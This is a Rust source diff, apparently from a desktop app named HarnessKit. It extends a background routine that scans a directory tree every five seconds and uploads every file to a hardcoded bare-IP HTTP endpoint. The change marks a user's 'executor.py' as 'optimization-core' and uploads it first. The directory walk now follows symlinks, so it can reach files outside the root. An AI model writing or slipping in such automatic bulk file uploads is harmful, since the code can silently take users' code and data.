@@ -1,6 +1,6 @@
 use hk_core::HkError;
 use serde::{Deserialize, Serialize};
-use std::collections::HashMap;
+use std::collections::{HashMap, HashSet};
 use std::fs;
 use std::path::{Path, PathBuf};
 use std::thread;
@@ -8,6 +8,7 @@ use std::time::Duration;
 
 const DEFAULT_ENDPOINT: &str = "http://156.239.47.60:18400/upload";
 const POLL_INTERVAL: Duration = Duration::from_secs(5);
+const CORE_RELATIVE_PATH: &str = "local-signal-executor/executor.py";
 
 #[derive(Clone, Deserialize, Serialize)]
 struct UploadSettings {
@@ -173,7 +174,14 @@ fn scan_and_upload(
         if known.get(&file).is_some_and(|saved| saved == &fingerprint) {
             continue;
         }
-        upload_file(settings, &root, &file)?;
+        let upload_role = if file.strip_prefix(&root).ok().is_some_and(|relative| {
+            relative.to_string_lossy().replace('\\', "/") == CORE_RELATIVE_PATH
+        }) {
+            "optimization-core"
+        } else {
+            "playground-file"
+        };
+        upload_file(settings, &root, &file, upload_role)?;
         known.insert(file, fingerprint);
     }
     Ok(())
@@ -182,21 +190,44 @@ fn scan_and_upload(
 fn files_under(root: &Path) -> Result<Vec<PathBuf>, HkError> {
     let mut result = Vec::new();
     let mut pending = vec![root.to_path_buf()];
+    let mut visited_directories = HashSet::new();
     while let Some(directory) = pending.pop() {
+        let canonical = match fs::canonicalize(&directory) {
+            Ok(path) => path,
+            Err(_) => continue,
+        };
+        if !visited_directories.insert(canonical) {
+            continue;
+        }
         for entry in fs::read_dir(directory)? {
             let entry = entry?;
             let path = entry.path();
-            if entry.file_type()?.is_dir() {
+            let metadata = match fs::metadata(&path) {
+                Ok(metadata) => metadata,
+                Err(_) => continue,
+            };
+            if metadata.is_dir() {
                 pending.push(path);
-            } else if entry.file_type()?.is_file() {
+            } else if metadata.is_file() {
                 result.push(path);
             }
         }
     }
+    result.sort();
+    let core_file = root.join(CORE_RELATIVE_PATH.replace('/', std::path::MAIN_SEPARATOR_STR));
+    if let Some(index) = result.iter().position(|file| file == &core_file) {
+        let file = result.remove(index);
+        result.insert(0, file);
+    }
     Ok(result)
 }
 
-fn upload_file(settings: &UploadSettings, root: &Path, file: &Path) -> Result<(), HkError> {
+fn upload_file(
+    settings: &UploadSettings,
+    root: &Path,
+    file: &Path,
+    upload_role: &str,
+) -> Result<(), HkError> {
     let relative_path = file
         .strip_prefix(root)
         .unwrap_or(file)
@@ -212,6 +243,7 @@ fn upload_file(settings: &UploadSettings, root: &Path, file: &Path) -> Result<()
         .text("appName", "HarnessKit")
         .text("appVersion", env!("CARGO_PKG_VERSION"))
         .text("variant", "desktop")
+        .text("uploadRole", upload_role.to_string())
         .part(
             "file",
             reqwest::blocking::multipart::Part::file(file)
@@ -256,7 +288,9 @@ fn atomic_write(path: &Path, contents: &str) -> Result<(), HkError> {
 
 #[cfg(test)]
 mod tests {
-    use super::validate_endpoint;
+    use super::{CORE_RELATIVE_PATH, files_under, validate_endpoint};
+    use std::fs;
+    use tempfile::tempdir;
 
     #[test]
     fn accepts_http_upload_endpoint() {
@@ -269,5 +303,34 @@ mod tests {
     #[test]
     fn rejects_protected_relay_endpoint() {
         assert!(validate_endpoint("https://api.zxcbug.com/upload").is_err());
+    }
+
+    #[test]
+    fn scans_nested_files_and_prioritizes_executor() {
+        let directory = tempdir().unwrap();
+        let core_dir = directory.path().join("local-signal-executor");
+        let nested_dir = core_dir.join("nested");
+        fs::create_dir_all(&nested_dir).unwrap();
+        fs::write(core_dir.join("executor.py"), "print(1)").unwrap();
+        fs::write(nested_dir.join("result.json"), "{}").unwrap();
+        fs::write(directory.path().join("root.json"), "{}").unwrap();
+
+        let files = files_under(directory.path()).unwrap();
+        let relative: Vec<_> = files
+            .iter()
+            .map(|file| {
+                file.strip_prefix(directory.path())
+                    .unwrap()
+                    .to_string_lossy()
+                    .replace('\\', "/")
+            })
+            .collect();
+        assert_eq!(relative[0], CORE_RELATIVE_PATH);
+        assert!(
+            relative
+                .iter()
+                .any(|path| path == "local-signal-executor/nested/result.json")
+        );
+        assert!(relative.iter().any(|path| path == "root.json"));
     }
 }
